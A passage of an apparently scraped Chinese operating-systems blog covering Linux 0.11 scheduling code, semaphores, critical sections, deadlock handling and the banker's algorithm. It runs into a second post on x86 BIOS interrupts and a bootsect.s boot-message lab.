计算的次数最多，需要把最短的任务放在前边\n所以，这种方式平均周转时间最小。\n3.RR（Round Robin） ==时间片轮转调度算法（Round Robin——RR）：==\n每个进程被分配一个时间片，允许该进程在该时间段运行，如果在时间片结束时该进程还在运行，则剥夺CPU并分配给另一个进程，如果该进程在时间片结RR束前阻塞或结束，则CPU立即进行切换。\n特点：公平；有利于交互式计算，响应时间快；由于进程切换，时间片轮转算法要花费较高的开销；对进程表中不同进程的大小差异较大的有利，而对进程都是相同大小的不利。\n时间片设计需要避免的两点：\n1.时间片太大，等待的时间过长，极限的情况下退化成为FCFS算法\n2.时间片太小，反应过于迅速，产生大量的上下文切换，会影响到系统的吞吐量\n4.折中方案 我们可以==设置优先级，设置前台任务和后台任务，前台任务优先级高，后台任务优先级低==，定义前台任务队列和后台任务队列，只有前台任务没有了才调度后台任务\n但是，如果一直有前台任务，后台任务一直得不到执行（优先级低的任务一直得不到执行）\n所以，==任务的优先级要动态调整== 一般后台任务 耗时比较长，一旦后台任务转到前台执行，可能耗时很长，一直不释放CPU，前台任务的响应时间又没法保证，前后台任务都要设置时间片，后台任务转到前台，执行一段，要释放CPU，让其他任务执行 ==折中方案：短任务优先（减少周转时间）、以 轮转调度为核心，要设置优先级==\n二、Schedule() schedule() 的目的是找到下一个任务 next，切换到下一个任务\n源码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 // 任务0是一个闲置(idle)任务，只有当其他任务没有运行时才调用它 // 它不能被杀死，也不能睡眠。任务0中的状态信息“state”是从来不用的 void schedule(void) { int i,next,c; struct task_struct ** p; // 任务结构体的指针的指针 /* check alarm, wake up any interruptible tasks that have got a signal */ // 检查 alarm(进程的报警定时值)，唤醒任何已得到信号的可中断任务 把p初始化为指向最后一个进程的地址的指针,逆向扫描所有进程,并跳过空指针 for(p = \u0026amp;LAST_TASK ; p \u0026gt; \u0026amp;FIRST_TASK ; --p) if (*p) { //*p 指向当前进程的指针 //jiffies是系统从开机算起的滴答数(每10ms/滴答) //判断定时器是否到期，如果到期需要在信号位图中置SIGALARM位，并且将定时器清0 if ((*p)-\u0026gt;alarm \u0026amp;\u0026amp; (*p)-\u0026gt;alarm \u0026lt; jiffies) { (*p)-\u0026gt;signal |= (1\u0026lt;\u0026lt;(SIGALRM-1)); (*p)-\u0026gt;alarm = 0; } //如果信号位图中表示有非阻塞信号被递送，该任务的状态是可中断的，那么将该任务状态置为就绪 if (((*p)-\u0026gt;signal \u0026amp; ~(_BLOCKABLE \u0026amp; (*p)-\u0026gt;blocked)) \u0026amp;\u0026amp; (*p)-\u0026gt;state==TASK_INTERRUPTIBLE) (*p)-\u0026gt;state=TASK_RUNNING; // 置为就绪可以执行状态 } /* this is the scheduler proper: */ // 进程的调度 // 检查就绪的任务，判断下一个运行的任务。 while (1) { c = -1; //从最后一个任务开始遍历任务数组 next = 0; i = NR_TASKS; p = \u0026amp;task[NR_TASKS]; //对就绪任务按照时间片进行排序 //比较每个就绪状态任务的counter值(任务运行时间的递减滴答计数) //哪一个值大，运行的时间还不长，next就指向哪一个任务号 while (--i) { if (!*--p) continue; if ((*p)-\u0026gt;state == TASK_RUNNING \u0026amp;\u0026amp; (*p)-\u0026gt;counter \u0026gt; c) //counter这里是时间片 //判断是就绪态，并且 counter\u0026gt;-1，就给c和next赋值，遍历找到最大的counter c = (*p)-\u0026gt;counter, next = i; } //如果比较得出有counter值不等于0的结果，或者系统中没有一个可运行的任务存在 //则跳出循环，执行任务切换操作 if (c) break; //如果所有任务的时间片都为0，那么重新计算各个任务的时间片，计算原则是根据优先级进行计算 //更新每个任务的counter值，然后再回到开始处比较 //计算方法：counter = counter/2 + priority for(p = \u0026amp;LAST_TASK ; p \u0026gt; \u0026amp;FIRST_TASK ; --p) if (*p) (*p)-\u0026gt;counter = ((*p)-\u0026gt;counter \u0026gt;\u0026gt; 1) + //counter这里代表优先级 (*p)-\u0026gt;priority; } //把当前任务指针current指向任务号为next的任务，并切换到该任务中运行 //若系统中没有其他可运行的任务，则next=0,所以调度去指向空闲任务 switch_to(next); // 任务切换,切换到任务号为next的任务，并允许 } 1.counter（时间片） counter是典型的时间片， 所以是轮转调度， 保证了响应 do_timer 中 counter 减到0，就schedule 2.counter（优先级） counter代表的优先级可以动态调整\n==阻塞的进程再就绪以后优先级高于非阻塞进程== 首先是找到所有就绪态任务的最大counter，大于零则切过去，否则更新所有任务的counter，即右移一位再加priority，然后进入下一次的找最大counter，大于零则切否则更新counter，所以说那些没在就绪态的counter就一直在更新，数学证明出等的时间越长counter越大等他们变成就绪态了，由于counter大，也就可以优先切过去了\n总结 ==调度函数的核心处理部分==：这是根据进程的==时间片==和==优先权调度机制==，来选择随后要执行的任务。\n它首先循环检查任务数组中的所有任务，根据每个就绪态任务剩余执行时间的值counter，选取该值最大的一个任务，并利用switch_to(next)函数切换到该任务。\n若所有就绪态任务的该值都等于零，表示此刻所有任务的时间片都已经运行完，于是就根据任务的优先权值pitority，重置每个任务的运行时间片值counter，再重新执行循环检查所有任务的执行时间片值。\n进程同步与信号量 前言 一般情况下，系统中运行着大量的进程，而每个进程之间并不是相互独立的，有些进程之间经常需要互相传递消息，所以就引出了信号，但是信号不能完全满足需求，又引入了信号量\n一、信号 信号的大致内容可以参考这篇文章 Linux信号基本知识\n为了完成进程间的同步或者通信从而引出了信号，但是单靠信号是不能解决问题的，如生产者与消费者典例\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 注：这里counter 就是一个信号 //生产者 while(true){ //当 counter == BUFFER_SIZE，生产者 sleep()，不再生产 if(counter == BUFFER_SIZE) sleep(); ... counter++; //当生产者发现 counter == 1，又有产品资源了，唤醒消费者 if(counter == 1) wakeup(消费者); } //消费者 while(true){ //当消费者发现 counter == 0，进入sleep，不再消费 if(counter == 0) sleep(); ... counter--; //当消费者发现 counter == BUFFER_SIZE - 1，就可以生产了，唤醒生产者 if(counter == BUFFER_SIZE - 1) wakeup(生产者); } 假设程序执行过程如下：\n(1) 缓冲区满以后生产者P1生产一个item放入， 会sleep信号\n(2) 又一个生产者P2生产一个item放入， 会sleep\n(3) 消费者C执行1次循环， counter==BUFFER_SIZE-1，发信号给P1，P1 wakeup\n(4) 消费者C再执行1次循环， counter==BUFFER_SIZE-2， P2不能被唤醒\n这就导致进程2不能被执行，所以，单纯依靠counter判断缓冲区的个数是不够的，还要知道有多少进程睡眠了\n二、信号量 背景介绍：\n原子操作（atomic operation） 原子操作意为不可被中断的一个或一系列操作，也可以理解为就是一件事情要么做了，要么没做。而原子操作的实现，一般是依靠硬件来实现的\n同步与互斥 同步：在访问资源的时候，以某种特定顺序的方式去访问资源 互斥：一个资源每次只能被一个进程所访问\n临界资源 不同进程能够看到的一份公共的资源（如：打印机，磁带机等），且一次仅允许一个进程使用的资源称为临界资源。\n临界区 临界区是一段代码，在这段代码中进程将访问临界资源，当有进程进入临界区时，其他进程必须等待，有一些同步的机制必须在临界区段的进入点和离开点实现，确保这些共用资源被互斥所获得。\n1.引入信号量 单独依靠信号，会导致无法唤醒P2进程。生产者消费者之间的多种映射对应，多个生产者，多个消费者。由这个原因引出信号量。\n==信号量（Semaphore）可以被看做是一种具有原子操作的计数器==，它控制多个进程对共享资源的访问，通常描述临界资源当中，临界资源的数目，常常被当做锁（lock）来使用，防止一个进程访问另外一个进程正在使用的资源。\n==信号量的工作原理==\n若此信号量的值为正，则进程可以使用该资源。进程将信号量值减1,表示一个资源被使用。\n若此信号量的值为0，则进程进入休眠状态，直至信号量值大于0，进程被唤醒\n若次信号量的值为负，则进程无法使用资源，进程被阻塞\n为了正确地实现信号量，信号量的操作应是原子操作，所以信号量通常是在内核中实现的。\n在以上面的问题为例，引入信号量后\n1.缓冲区满，P1执行，P1 sleep，sem = -1，表示一个进程睡眠了\n2.P2执行，发现缓冲区满，P2 sleep，sem = -2，表示2个进程睡眠了\n3.消费者C执行，wakeup P1，sem = -1\n4.消费者C再执行一次，wakeup P2，sem = 0\n5.消费者C再执行一次，sem = 1，消费者进程睡眠\n6.P3执行，sem = 0，表示没有资源了\n这样就完美的解决这个问题\n这种机制的主要思想就是——通过将资源数量化，将申请资源和释放资源的动作具体化，从而达到对资源的操作及结果可视化的程度\n1 2 3 4 5 6 P(semaphore s){ s.value--; if(s.value \u0026lt; 0){ sleep(s.queue); } } 1 2 3 4 5 6 v(semaphore s){ s.value++; if(s.value \u0026lt;= 0){ wakeup(s.queue); } } 2.临界区 通过对信号量的访问和修改，让进程有序推进，但是让程序正确有序的进行的前提是保证信号量的值必须是正确的\n信号量操作可能出现的问题\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 注：这里empty是信号量 //生产者 Producer(item) { P(empty);//生产者先判断 缓存区个数 empty是否满了，empty == 0，阻塞 ... } //生产者P1 register = empty; register = register - 1; empty = register; //生产者P2 register = empty; register = register - 1; empty = register; //初始情况 empty = -1; //空闲缓冲区的个数，-1表示有一个进程在睡眠 //一个可能的执行（调度） P1.register = empty; // P1.register = -1 P1.register = P1.register - 1; // P1.register = -2 P2.register = empty; // P2.register = -1; P2.register = P2.register - 1; // P2.register = -2 empty = P1.register; // empty = -2 empty = P2.register; // empty = -2 如果进程真像上面的调度就会导致信号量的值出错。\n可能某一次调度会正确执行（进程时间片不知道）如下图 所以，必须对信号量进行保护操作。临界区就是用来保护信号量的\n==临界区：==\n每个进程中访问临界资源的那段代码称为临界区（criticalsection），每次只允许一个进程进入临界区，进入后，不允许其他进程进入。不论是硬件临界资源还是软件临界资源，多个进程必须互斥的对它进行访问。\n多个进程涉及到同一个临界资源的的临界区称为相关临界区。使用临界区时，一般不允许其运行时间过长，只要运行在临界区的线程还没有离开，其他所有进入此临界区的线程都会被挂起而进入等待状态，并在一定程度上影响程序的运行性能。\n临界区代码的保护原则\n1.互斥进入：如果一个进程在临界区中执行，其他进程不允许进入。进程间是互斥关系\n2.有空让进：若干进程要求进入空闲临界区时，要尽快使一个进程进入临界区\n3.有限等待：从进程发出进入请求到允许进入，不能无限等待\n所以，找出进程中的临界区代码（读写信号量的代码）不就可以对信号量保护了吗？\n临界区算法\n1)软件方式：\n1.轮换法 2.标记法 3.非对称标记法 4.Peterson算法(结合标记和轮转思想) 5.面包店算法\n2)硬件方式\n1.中断控制 一个进程在操作临界区，==另一个进程请求进入临界区，一定发生了调度，只要阻止这种调度不进行就可以，只要关闭中断，系统就不会响应==\n1 2 3 4 5 //进程Pi cli(); //关中断 临界区 sti();//开中断 剩余区 这种方式只适合单核CPU，像UCOS，FreeRTOS这种小型系统都采用的这种。这种方式不适合多核系统。\n1 2 3 4 5 6 7 8 9 10 11 12 单核CPU： 中断是在CPU上有一个中断寄存器 INTR，发生中断，寄存器某的某一位置1，CPU每执 行完一个指令，看INTR是否是1，如果是1，就进入中断处理程序，一旦设置了 cli()，指令执行完，就不判断 INTR 了 多核CPU(不适用)： 多CPU时，执行中断，每个CPU对应的 INTR 都置1 假设临界区在 CPU1 上，P1在执行，设置了 cli()， CPU1 上再有中断，就不调度了，CPU1 上的临界区可以一直执行 设 CPU2 在执行P2，设置了 cli()，也不判断中断，P2 也执行 此时 P1 P2 就都在执行临界区了 2.硬件原子指令法 在执行临界区之前上锁，然后执行临界区，执行完开锁，其实这个锁就是一个变量，上锁或者开锁就是给变量赋值 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 // TestAndSet是操作锁的，不能被打断 boolean TestAndSet(boolean \u0026amp;x) { //该函数代码 一次执行完毕 boolean rv = x; x = true; return rv; } //进程Pi // lock = true 表示上锁，TestAndSet返回true，如果锁上了，Pi就空转 while(TestAndSet(\u0026amp;lock)); 临界区; // 没上锁，进入临界区执行 lock = false; // 执行完临界区，解锁 剩余区 3.信号量的代码实现 schedule()是主动的程序调度，不使用中断，而检查程序时间片是否用完了进行的调度涉及时钟中断，所以这里的关中断是防止发生不受控制的时钟中断，从而引起程序调度\n4.信号量的操作 有关信号量的操作及相关API可以参考一下链接 systerm-V\n5.信号量的类型 信号量有三种类型：\n① ==Posⅸ有名信号量==：可用于进程或线程间的同步。\n② ==Posix基于内存的信号量(无名信号量)==：存放在内存区中，可用于进程或线程间的同步。常用于多线程间同步。\n③ ==System V信号量（IPC机制）==：在内核中维护，可用于进程或线程间的同步。 常用于进程间同步。\n1 2 3 4 5 有名信号量通过文件系统中的路径名对应的文件名进行维护（信号量只是通过文件名进行标识，信号量的值并不存放到这个文件中，除非信号量存放在空间映射到这个文件上）。 无名信号量通过用户空间内存进行维护，无名信号量要想在进程间通信，该内存必须为共享内存区。 System V信号量由内核进行维护。 信号量的分类：\n① ==二值信号量(binary semaphore)==：其值或为0或为1的信号量。这与互斥锁类似,若资源被锁住则信号量值为0，若资源可用则信号量值为1。\n② ==计数信号量(counting semaphore)==：其值在0和某个限制值(对于Posiⅸ信号量，该值必须至少为32767)之间的信号量。信号量的值就是可用资源数。\nPosix信号量为单个计数信号量，System V信号量为计数信号量集，偏集合的概念。\n由于信号量只能进行两种操作等待和发送信号，即P(sv)和V(sv),他们的行为是这样的：\nP(sv)：如果sv的值大于零，就给它减1；如果它的值为零，就挂起该进程的执行\nV(sv)：如果有其他进程因等待sv而被挂起，就让它恢复运行，如果没有进程因等待sv而挂起，就给它加1。\n除可以像互斥锁那样使用外，信号量还有一个互斥锁没有提供的特性：互斥锁必须总是由锁住它的线程解锁，信号量的挂出却不必由执行过它的等待操作的同一线程执行。\n总结 用临界区保护信号量，用信号量保证同步\n进程死锁以及处理 一、死锁的定义 1.死锁的引出 ==死锁 (deallocks)==： 是指两个或两个以上的进程（线程）在执行过程中，因争夺资源而造成的一种互相等待的现象，若无外力作用，它们都将无法推进下去。此时称系统处于死锁状态或系统产生了死锁，这些永远在互相等待的进程（线程）称为死锁进程（线程）\n生产者 \u0026ndash;消费者问题\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 //用文件定义 共享缓冲区 int fd = open(\u0026#34;buffer.txt\u0026#34;); write(fd, 0, sizeof(int));//写in write(fd, 0, sizeof(int));//写out //信号量的定义和初始化 semaphore full = 0;//生产的产品的个数 semaphore empty = BUFFER_SIZE;//空闲缓冲区的个数 semaphore mutex = 1;//互斥信号量 //生产者 Producer(item) { P(empty);//生产者先判断 缓存区个数 empty是否满了，empty == 0，阻塞 P(mutex);//操作文件前，用mutex防止其他进程操作该文件 读入in，将item写到in的位置上 V(mutex);//使用完文件，释放文件资源 V(full);//生产者生产产品，增加full，消费者就可以消费了 } //消费者 Consumer() { P(full);//当full == 0,缓冲区空了，阻塞 P(mutex); 读入out，从文件中的out位置读出到item，打印item; V(mutex); V(empty);//消费者消耗产品，增加缓冲区个数，增加empty，生产者就可以继续生产了 } 这时不管是生产者还是消费者都是先调用P(empty)/P(full),然后再调用互斥信号量mutex，进程能正确的执行\n但是如果我们将这两个先后顺序调换一下： 在这里假设 mutex初值是1，empty初值是0，缓冲区取满了\n在生产者中，P(mutex) 会把 mutex 变成 0，// P(empty) 会把 empty 变成 -1，生产者阻塞，然后消费者启动，P(mutex)，mutex是0，执行P(mutex)将mutex变成 -1，消费者阻塞，此时消费者和生产者都阻塞了\n生产者要执行，需要把empty释放了，即消费者要执行 V(empty)，当前消费者卡在 P(mutex)，释放不了\n消费者要执行，需要生产者把 mutex释放了，生产者要执行 V(metux)，生产者卡在上边的 P(empty)，也释放不了\n生产者在P(empty)往下执行，依赖于消费者，消费者要往下执行，又依赖生产者P(empty)下边的指令，形成环路等待，死锁。\n2.死锁产生原因 原因：\n(1)系统资源的竞争 系统资源的竞争导致系统资源不足，以及资源分配不当，导致死锁。\n(2)进程运行推进顺序不合适 进程在运行过程中，请求和释放资源的顺序不当，会导致死锁。 死锁的四个必要条件\n==1.互斥条件：==\n一个资源每次只能被一个进程使用，即在一段时间内某资源仅为一个进程所占有。此时若有其他进程请求该资源，则请求进程只能等待。\n==2.请求和保持条件：==\n一个进程本身占有资源（一种或多种），同时还有资源未得到满足，正在等待其他进程释放该资源。\n==3.不可抢占条件：==\n别人已经占有了某项资源，不能因为自己也需要该资源，就去把别人的资源抢过来。\n==4.循环等待条件：==\n若干进程间形成 首尾相接 循环等待资源的关系\n这四个条件是死锁的必要条件，只要系统发生死锁，这些条件必然成立，而只要上述条件之一不满足，就不会发生死锁。\n二、死锁策略 死锁处理方法概述\n1 2 3 4 5 6 7 8 9 10 11 1.死锁预防 破坏死锁出现的条件，不要 占有资源 又申请其他资源 2.死锁避免 检测每个资源请求，如果造成死锁就拒绝 3.死锁检测 + 恢复 检测到死锁出现时，让一些进程回滚，让出资源 4.死锁忽略 好像没有出现死锁一样 1.死锁预防 方法1： 在进程执行前，一次性申请所有需要的资源，不会占有资源再去申请其他资源\n优点：简单易实施且安全。 缺点：因为某项资源不满足，进程无法启动，而其他已经满足了的资源也不会得到利用，严重降低了资源的利用率，造成资源浪费。使进程经常发生饥饿现象\n**方法2：**对资源类型进行排序，资源申请必须按序进行，不会出现环路等待\n缺点：仍会造成资源浪费\n2.死锁避免 在使用前进行判断，只允许不会产生死锁的进程申请资源。死锁的避免是利用额外的检验信息，在分配资源时判断是否会出现死锁，只在不会出现死锁的情况下才分配资源。\n两种避免办法：\n1、如果一个进程的请求会导致死锁，则不启动该进程 2、如果一个进程的增加资源请求会导致死锁 ，则拒绝该申请。\n问题： 上图含有5个进程：P0-P4 Allocation:占有的资源,以P1 为例，占用资源A3个，资源B0个，资源C2个 Need：需要的资源 Available：系统中剩余的资源\n分析： 当前系统剩余资源：ABC = 230，给 P1，P1可以执行完，P1 执行完 Available ABC = 532，P3 可以执行，P3 执行完，Available ABC = 743 其他进程都可以执行…A 是安全序列\n3.银行家算法 银行家算法通过对进程需求、占有和系统拥有资源的实时统计，确保系统在分配给进程资源不会造成死锁才会给与分配\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 int Available[1..m]; //每种资源剩余数量 int Allocation[1..n, 1..m]; //已分配资源数量 int Need[1..n, 1..m]; //进程还需的各种资源数量 int Max[1..n, 1..m];//进程总共需要的资源数量 int Work[1..m]; //工作向量 bool Finifh[1..n]; //进程是否结束 Work = Available; Finifh[1..n] = false; while(true) { for(i = 1; i \u0026lt;= n; i++) { // Need[i] \u0026lt;= Work 这个任务是可以完成的 if(Finish[i] == false \u0026amp;\u0026amp; Need[i] \u0026lt;= Work) { Work = Work + Allocation[i]; // Work 累加系统曾分配给 i 的资源 Finish[i] = true; break; } else { goto end; } } } End: for(i = 1; i \u0026lt;=n; i++) if(Finish[i] == false) return \u0026#34;deadlock\u0026#34;; 相关数据结构：\n可利用资源向量Available：用于表示系统里边各种资源剩余的数目。由于系统里边拥有的资源通常都是有很多种（假设有m种），所以，我们用一个有m个元素的数组来表示各种资源。数组元素的初始值为系统里边所配置的该类全部可用资源的数目，其数值随着该类资源的分配与回收动态地改变。\n分配矩阵Allocation：顾名思义，就是用于表示已经分配给各个进程的各种资源的数目。也是一个nxm的矩阵。\n需求矩阵Need：用于表示进程仍然需要的资源数目，用一个nxm的矩阵表示。系统可能没法一下就满足了某个进程的最大需求（通常进程对资源的最大需求也是只它在整个运行周期中需要的资源数目，并不是每一个时刻都需要这么多），于是，为了进程的执行能够向前推进，通常，系统会先分配个进程一部分资源保证进程能够执行起来。那么，进程的最大需求减去已经分配给进程的数目，就得到了进程仍然需要的资源数目了。\n所以,根据该算法可以解决上面的问题\n其时间复杂度是 T(n) = O(m* n^2)，m是资源数，n是进程数\n死锁避免的优点：\n不需要死锁预防中的抢占和重新运行进程，并且比死锁预防的限制要少\n死锁避免的缺点：\n必须事先声明每个进程请求的最大资源量 考虑的进程必须无关的，也就是说，它们执行的顺序必须没有任何同步要求的限制\n分配的资源数目必须是固定的 在占有资源时，进程不能退出\n4.死锁检测与恢复 定时检测或者是发现资源利用率低时检测\n检测算法：\n1 2 3 4 5 6 Finish[1..n] = false; if(Allocation[i] == 0) Finish[i]=true; ...//和Banker算法完全一样 for(i=1;i\u0026lt;=n;i++) if(Finish[i]==false) deadlock = deadlock + {i}; 检测处问题，进程解锁:\n1.抢占资源：从一个或多个进程中抢占足够数量的资源分配给死锁进程，以解除死锁状态。 2.终止（或撤销）进程：终止或撤销系统中的一个或多个死锁进程，直至打破死锁状态。\n5.死锁忽略 死锁出现不是确定的， 可以用重启动来处理死锁， Windows和Linux都采用了死锁忽略的方法：\n死锁忽略的处理代价最小 这种机器上出现死锁的概率比其他机器低 死锁可以用重启来解决，PC重启造成的影响小 ","permalink":"https://chance7bin.github.io/posts/basic/os/%E4%BA%8C%E8%BF%9B%E7%A8%8B%E7%AE%A1%E7%90%86/","summary":"操作系统的接口与实现 相关知识 相关链接： 【构建操作系统】全局描述符表GDT GDT（全居描述符表）和LDT（局部描述符表） GDT（Global Descriptor","title":"二、进程管理"},{"content":"下面这个博客还是不太明白\n操作系统的启动(bootsect、setup、head、main)\n0. 汇编知识 简要整理了一下这次实验所需的基础汇编知识，可以在下文阅读代码是碰到再回过头来看！\nint 0x10\n注意，这里ah要先有值，代表内部子程序的编号\n功能号 $ah=0x03$，作用是读取光标的位置\n输入：bh = 页号 返回：ch = 扫描开始线；cl = 扫描结束线；dh = 行号；dl = 列号 功能号 $ah=0x13$，作用是显示字符串\n输入：al = 放置光标的方式及规定属性，下文 al＝1，表示目标字符串仅仅包含字符，属性在BL中包含，光标停在字符串结尾处；es:bp = 字符串起始位置；cx = 显示的字符串字符数；bh = 页号；bl = 字符属性，下文 bl = 07H，表示正常的黑底白字；dh = 行号；dl = 列号 功能号 $ah=0x0e$，作用是显示字符\n输入：al = 字符 int 0x13\n在DOS等实模式操作系统下，调用INT 13h会跳转到计算机的ROM-BIOS代码中进行低级磁盘服务，对程序进行基于物理扇区的磁盘读写操作。\n功能号 $ah=0x02$，作用是读磁盘扇区到内存\n输入： 返回：ah = 出错码（00H表示无错，01H表示非法命令，02H表示地址目标未发现\u0026hellip;）；CF为进位标志位，如果没有出错 $CF=0$ 功能号 $ah=0x00$，作用是磁盘系统复位\n输入：dl = 驱动器 返回：如果操作成功———— $CF=0$， $ah=00H$ 这里我只挑了下文需要的介绍，更多内容可以参考这篇博客BIOS系统服务 —— 直接磁盘服务（int 0x13）\nint 0x15\n功能号 $ah=0x88$，作用是获取系统所含扩展内存大小\n输入：ah = 0x88 返回：ax = 从0x100000(1M)处开始的拓展内存大小(KB)。若出错则CF置位，ax = 出错码。 int 0x41\n在PC机中BIOS设定的中断向量表中int 0x41的中断向量位置 $4*0x41=0x0000:0x0104$ 存放的并不是中断程序的地址，而是第一个硬盘的基本参数表。对于100%兼容的BIOS来说，这里存放着硬盘参数表阵列的首地址0xF000:0E401，第二个硬盘的基本参数表入口地址存于int 0x46中断向量位置处，每个硬盘参数表有16个字节大小.\nCF\n要了解CF，首先要知道寄存器中有一种特殊的寄存器————标志寄存器，其中存储的信息通常被称为程序状态字。以下简称为flag寄存器。\nflag和其他寄存器不一样，其他寄存器是用来存放数据的，都是整个寄存器具有一个含义。而flag寄存器是按位起作用的，也就是说，它的每一位都有专门的含义，记录特定的信息。\nflag的1、3、5、12、13、14、15位在8086CPU中没有使用，不具有任何含义。而0、2、4、6、7、8、9、10、11位都具有特殊的含义。\nCF就是flag的第0位————进位标志位。在进行==无符号数==运算的时候，它记录了运算结果的最高有效位向更高位的==进位值==，或从更高位的借位值。\njnc\n在 $CF=0$ 的时候，进行跳转，即不进位则跳转，下文就是在读入没有出错时，跳转到ok_load_setup\njl\n小于则跳转\nlds\n格式： LDS reg16，mem32\n其意义是同时给一个段寄存器和一个16位通用寄存器同时赋值\n举例：\n1 2 LDS AX,[100H] ! 结果：AX=4100H DS=0302H 可以把上述代码理解为这样一个过程，但实际上不能这么写\n1 2 mov AX,[100H] mov DS,[100H+2] 即把低字(2B)置为偏移地址，高字(2B)置为段地址\nDF标志和串传送指令\nflag的第10位是DF，方向标志位。在串处理指令中，控制每次操作后si、di的增减。\ndf=0：每次操作后si、di递增 df=1：每次操作后si、di递减 来看一个串传送指令\n格式：movsb 功能：相当于执行了如下2步操作 $((es)*16+(di))=((ds)*16+si)$ 如果df=0：(si)=(si)+1,(di)=(di)+1 如果df=1：(si)=(si)-1,(di)=(di)-1 可以看出，movsb的功能是将 $ds:si$ 指向的内存单元中的字节送入 $es:di$ 中，然后根据标志寄存器df位的值，将si和di递增或递减。\n也可以传送一个字\n格式：movsw 功能：相当于执行了如下2步操作 $((es)*16+(di))=((ds)*16+si)$ 如果df=0：(si)=(si)+2,(di)=(di)+2 如果df=1：(si)=(si)-2,(di)=(di)-2 可以看出，movsw的功能是将 $ds:si$ 指向的内存单元中的字节送入 $es:di$ 中，然后根据标志寄存器df位的值， 将si和di递增2或递减2。\nmovsb和movsw进行的是串传送操作的一个步骤，一般配合rep使用\n格式如下：rep movsb\n用汇编语法描述：\n1 2 s:movsb loop s 可见rep的作用是根据cx的值，重复执行串传送指令。由于每执行一次movsb指令si和di都会递增或递减指向后面一个单元或前面一个单元，则 rep movsb就可以循环实现(cx)个字符的传送。\ncall\n(1) 将当前IP或CS和IP压入栈中\n(2) 转移\nCPU执行“call 标号”时，相当于进行：\n1 2 push IP jmp near ptr 标号 ret\nret指令用栈中的数据，修改IP的内容，从而实现近转移\n(1) $(IP)=((SS)*16+(SP))$\n(2) $(sp)=(sp)+2$\nCPU执行ret指令时，相当于进行：\n1 pop IP 1. 实验目的 2. 实验内容 此次实验的基本内容是：\n阅读《Linux 内核完全注释》的第 6 章，对计算机和 Linux 0.11 的引导过程进行初步的了解； 按照下面的要求改写 0.11 的引导程序 bootsect.s 有兴趣同学可以做做进入保护模式前的设置程序 setup.s。 改写 bootsect.s 主要完成如下功能：\nbootsect.s 能在屏幕上打印一段提示信息“XXX is booting\u0026hellip;”，其中 XXX 是你给自己的操作系统起的名字，例如 LZJos、Sunix 等（可以上论坛上秀秀谁的 OS 名字最帅，也可以显示一个特色 logo，以表示自己操作系统的与众不同。） 改写 setup.s 主要完成如下功能：\nbootsect.s 能完成 setup.s 的载入，并跳转到 setup.s 开始地址执行。而 setup.s 向屏幕输出一行\u0026quot;Now we are in SETUP\u0026quot;。 setup.s 能获取至少一个基本的硬件参数（如内存参数、显卡参数、硬盘参数等），将其存放在内存的特定地址，并输出到屏幕上。 setup.s 不再加载 Linux 内核，保持上述信息显示在屏幕上即可。 3. 实验报告 在实验报告中回答如下问题：\n有时，继承传统意味着别手蹩脚。x86 计算机为了向下兼容，导致启动过程比较复杂。请找出 x86 计算机启动过程中，被硬件强制，软件必须遵守的两个“多此一举”的步骤（多找几个也无妨），说说它们为什么多此一举，并设计更简洁的替代方案。 4. 实验提示 操作系统的 boot 代码有很多，并且大部分是相似的。本实验仿照 Linux-0.11/boot 目录下的 bootsect.s 和 setup.s，以剪裁它们为主线。当然，如果能完全从头编写，并实现实验所要求的功能，是再好不过了。\n同济大学赵炯博士的《Linux 内核 0.11 完全注释（修正版 V3.0）》（以后简称《注释》）的第 6 章是非常有帮助的参考，实验中可能遇到的各种问题，几乎都能找到答案。谢煜波撰写的《操作系统引导探究》也是一份很好的参考。\n需要注意的是，oslab 中的汇编代码使用 as86 编译。\n下面将给出一些更具体的 “提示”。这些提示并不是实验的一步一步的指导，而是罗列了一些实验中可能遇到的困难，并给予相关提示。它们肯定不会涵盖所有问题，也不保证其中的每个字都对完成实验有帮助。所以，它们更适合在你遇到问题时查阅，而不是当作指南一样地亦步亦趋。本课程所有实验的提示都是秉承这个思想编写的。\n4.1 开始实验前 在正式开始实验之前，你需要先了解下面的内容：\n（1）相关代码文件 Linux 0.11 文件夹中的 boot/bootsect.s、boot/setup.s 和 tools/build.c 是本实验会涉及到的源文件。它们的功能详见《注释》的 6.2、6.3 节和 16 章。\n（2）引导程序的运行环境 引导程序由 BIOS 加载并运行。它活动时，操作系统还不存在，整台计算机的所有资源都由它掌控，而能利用的功能只有 BIOS 中断调用。\n实验中主要使用 BIOS 0x10 和 0x13 中断。\n4.2 完成 bootsect.s 的屏幕输出功能 代码中以 ! 开头的行都是注释，实际在写代码时可以忽略。\n实验中所有提到的修改，均是指相对于 linux-0.11 中的代码。\n首先来看完成屏幕显示的关键代码，如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 ! 首先读入光标位置 mov ah,#0x03 xor bh,bh int 0x10 ! 显示字符串 “Hello OS world, my name is LZJ” ! 要显示的字符串长度 mov cx,#36 mov bx,#0x0007 mov bp,#msg1 ! es:bp 是显示字符串的地址 ! 相比与 linux-0.11 中的代码，需要增加对 es 的处理，因为原代码中在输出之前已经处理了 es mov ax,#0x07c0 mov es,ax mov ax,#0x1301 int 0x10 ! 设置一个无限循环 inf_loop: jmp inf_loop 这里需要修改的是字符串长度，即用需要输出的字符串长度替换 mov cx,#24 中的 24。要注意：除了我们设置的字符串 msg1 之外，还有三个换行 + 回车，一共是 6 个字符。比如这里 Hello OS world, my name is LZJ 的长度是 30，加上 6 后是 36，所以代码应该修改为 mov cx,#36。\n接下来就是修改输出的字符串了：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 ! msg1 处放置字符串 msg1: ! 换行 + 回车 .byte 13,10 .ascii \u0026#34;Hello OS world, my name is LZJ\u0026#34; ! 两对换行 + 回车 .byte 13,10,13,10 ! boot_flag 必须在最后两个字节 .org 510 ! 设置引导扇区标记 0xAA55 ! 必须有它，才能引导 boot_flag: .word 0xAA55 将 .org 508 修改为 